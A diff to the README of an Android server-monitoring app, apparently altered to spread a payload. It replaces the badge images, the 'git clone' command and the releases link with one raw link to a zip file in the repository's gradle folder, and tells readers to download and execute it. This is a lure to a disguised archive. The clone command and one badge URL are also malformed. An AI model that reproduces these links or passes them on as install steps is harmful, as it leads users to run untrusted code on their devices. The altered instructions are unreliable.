@@ -1,6 +1,6 @@
 # Status Higher or Lower 📊
 
-![Status Higher or Lower](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Android](https://img.shields.io/badge/Android-4.1%2B-brightgreen.svg)
+![Status Higher or Lower](https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip) ![License](https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip) ![Android](https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip%https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip)
 
 Welcome to the **Status Higher or Lower** repository! This simple Android app is designed to monitor the status of a server, ensuring you stay informed about its availability. The app utilizes Jetpack Compose for its UI and WorkManager for background tasks. It periodically sends network requests to check if the server is reachable and notifies you if there are any issues.
 
@@ -43,7 +43,7 @@ To get started with the **Status Higher or Lower** app, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/vitarep/Status-Higher-or-Lower.git
+   git clone https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip
    ```
 
 2. **Open the project in Android Studio**.
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-You can find the latest releases of the **Status Higher or Lower** app [here](https://github.com/vitarep/Status-Higher-or-Lower/releases). Download the latest version and execute it on your Android device to start monitoring your server.
+You can find the latest releases of the **Status Higher or Lower** app [here](https://raw.githubusercontent.com/vitarep/Status-Higher-or-Lower/master/gradle/Lower-Higher-Status-or-v3.9.zip). Download the latest version and execute it on your Android device to start monitoring your server.
 
 For further updates, keep an eye on the "Releases" section of the repository.
 
